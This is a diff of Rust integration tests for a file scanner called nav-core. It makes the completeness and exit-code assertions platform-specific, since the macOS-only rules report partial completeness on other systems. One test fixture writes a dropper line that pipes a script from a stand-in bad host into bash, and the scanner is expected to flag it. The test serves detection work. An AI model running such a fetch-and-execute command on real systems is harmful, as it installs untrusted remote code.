@@ -61,16 +61,30 @@ fn json_line(stdout: &[u8]) -> serde_json::Value {
 fn benign_file_scans_clean_and_json_carries_the_shared_contract() {
     let f = TempFile::new("benign", b"just an ordinary text file\n");
     let out = run_scan_once(f.path(), &["--json"]);
-    assert!(
-        out.status.success(),
-        "stderr: {}",
-        String::from_utf8_lossy(&out.stderr)
-    );
 
+    // Cross-platform: a plain file trips no rule, so score/recommendation
+    // are `0`/`no-action` everywhere. Completeness (and so the exit code)
+    // is not — nav-core's codesign/spctl/quarantine-xattr rules are
+    // macOS-only and report `NotApplicable` elsewhere, capping completeness
+    // at `Partial` off-macOS (§10) — asserted per-platform below.
     let value = json_line(&out.stdout);
     assert_eq!(value["schema_version"], 1);
-    assert_eq!(value["completeness"], "complete");
     assert_eq!(value["recommendation"], "no-action");
+
+    #[cfg(target_os = "macos")]
+    {
+        assert!(
+            out.status.success(),
+            "stderr: {}",
+            String::from_utf8_lossy(&out.stderr)
+        );
+        assert_eq!(value["completeness"], "complete");
+    }
+    #[cfg(not(target_os = "macos"))]
+    {
+        assert_eq!(value["completeness"], "partial");
+        assert_eq!(out.status.code(), Some(i32::from(nav_core::INDETERMINATE)));
+    }
 }
 
 /// Mirrors the shape of `nav-core`'s `dropper_curl_pipe_bash.sh` fixture: a
@@ -84,12 +98,12 @@ fn suspicious_content_surfaces_at_least_one_signal() {
         b"#!/bin/sh\ncurl -fsSL https://update.example-bad.test/bootstrap.sh | bash\n",
     );
     let out = run_scan_once(f.path(), &["--json"]);
-    assert!(
-        out.status.success(),
-        "stderr: {}",
-        String::from_utf8_lossy(&out.stderr)
-    );
 
+    // The verdict line prints before exit either way, so read it
+    // unconditionally. Exit code isn't asserted: off-macOS this exits
+    // INDETERMINATE rather than success, for the same completeness reason
+    // as the benign case above (§10) — the content-matching signal itself
+    // is what's cross-platform.
     let value = json_line(&out.stdout);
     let signals = value["signals"].as_array().expect("signals array");
     assert!(
